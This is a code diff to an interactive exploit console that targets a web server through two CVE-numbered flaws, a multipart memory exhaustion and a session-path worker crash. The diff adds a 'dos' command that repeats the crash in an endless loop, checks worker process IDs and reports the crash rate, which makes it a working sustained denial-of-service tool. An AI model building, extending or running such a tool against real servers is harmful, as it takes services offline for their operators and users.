@@ -5,6 +5,7 @@ import json
 import secrets
 import shlex
 import sys
+import time
 from http.cookies import SimpleCookie
 
 try:
@@ -48,7 +49,8 @@ BANNER = r"""
   health              Health check
   109618 [strategy]   Multipart parser OOM probe
   109619              Experimental backtrace -> early INI probe
-  session             Session lifecycle probe (A->B full sequence)
+  session             Session lifecycle probe (A->B, single round)
+  dos [rounds]        Sustained DoS — loop session A→B (Ctrl+C to stop)
   set                 Show settable parameters
   show                Show current config
   help                Full help
@@ -62,7 +64,8 @@ Commands:
   109618 [strategy]           Probe CVE-2026-109618 multipart OOM
                               Strategies: part-headers, empty-files, form-value, files-registration
   109619                      Experimental fatal-backtrace -> early INI path
-  session                     Probe CVE-2026-109619 session A->B path
+  session                     Probe CVE-2026-109619 session A->B path (single round)
+  dos [rounds]                Sustained DoS — loop session A→B crash (Ctrl+C to stop)
   set <key> <value>           Set parameter (see 'set' for list)
   help                        Show this help
   exit / quit                 Exit
@@ -138,6 +141,7 @@ class Console:
                 "109618": self.cmd_109618,
                 "109619": lambda *_: self.cmd_109619(),
                 "session": lambda *_: self.cmd_session(),
+                "dos": self.cmd_dos,
                 "set": self.cmd_set,
                 "help": lambda *_: print(HELP),
                 "exit": lambda *_: sys.exit(0),
@@ -420,6 +424,70 @@ class Console:
                     print("  \033[92mWorker crashed! (connection reset + server recovered)\033[0m")
             else:
                 print("  Worker survived — may need a different endpoint or settings")
+
+    def cmd_dos(self, rounds_str=None):
+        self.require_target()
+        rounds = int(rounds_str) if rounds_str else 0
+        label = f"{rounds} rounds" if rounds else "infinite — Ctrl+C to stop"
+        print(f"\033[93m[CVE-2026-109619] Sustained DoS ({label})\033[0m")
+        upload_path = self.path("session-upload")
+        consumer_body = multipart_consumer()
+        crashed = 0
+        failed = 0
+        start = time.monotonic()
+        current_pid = None
+        i = 0
+        try:
+            while rounds == 0 or i < rounds:
+                i += 1
+                sid = secrets.token_hex(16)
+                cookie = f"{self.session_name}={sid}"
+                if current_pid is None:
+                    probe = send(self.scheme, self.host, self.port, "GET",
+                                 upload_path, self.timeout, None, f"dos-baseline-{i}")
+                    if "transport_error" in probe:
+                        print(f"  #{i}: \033[91mserver unreachable\033[0m")
+                        failed += 1
+                        time.sleep(0.5)
+                        continue
+                    current_pid = probe.get("worker_pid_header")
+                producer_body = multipart_producer(self.field_bytes, "candidate",
+                                                   part_headers=self.part_headers)
+                producer, _ = session_request(
+                    self.scheme, self.host, self.port, "POST",
+                    upload_path, body=producer_body, cookie=cookie,
+                    timeout=self.timeout)
+                body_text = producer.get("body_prefix", "")
+                if "Allowed memory size" not in body_text:
+                    print(f"  #{i}: \033[91mno OOM\033[0m")
+                    failed += 1
+                    continue
+                consumer, _ = session_request(
+                    self.scheme, self.host, self.port, "POST",
+                    upload_path, body=consumer_body, cookie=cookie,
+                    timeout=self.timeout)
+                if "transport_error" not in consumer:
+                    print(f"  #{i}: \033[93mworker survived\033[0m")
+                    failed += 1
+                    continue
+                verify = send(self.scheme, self.host, self.port, "GET",
+                              upload_path, self.timeout, None, f"dos-verify-{i}")
+                new_pid = verify.get("worker_pid_header") if "transport_error" not in verify else None
+                if current_pid and new_pid and current_pid != new_pid:
+                    print(f"  #{i}: \033[92mPID {current_pid} → {new_pid}\033[0m")
+                elif "transport_error" in verify:
+                    print(f"  #{i}: \033[92mcrashed + server down\033[0m")
+                else:
+                    print(f"  #{i}: \033[92mcrashed\033[0m")
+                crashed += 1
+                current_pid = new_pid
+        except KeyboardInterrupt:
+            print()
+        elapsed = time.monotonic() - start
+        print(f"\n\033[93m  {crashed} workers crashed, {failed} failed,"
+              f" {i} rounds in {elapsed:.1f}s\033[0m")
+        if crashed and elapsed > 0:
+            print(f"  \033[92m{crashed / elapsed:.2f} crashes/sec\033[0m")
 
     def cmd_set(self, key=None, value=None, *_):
         if key is None:
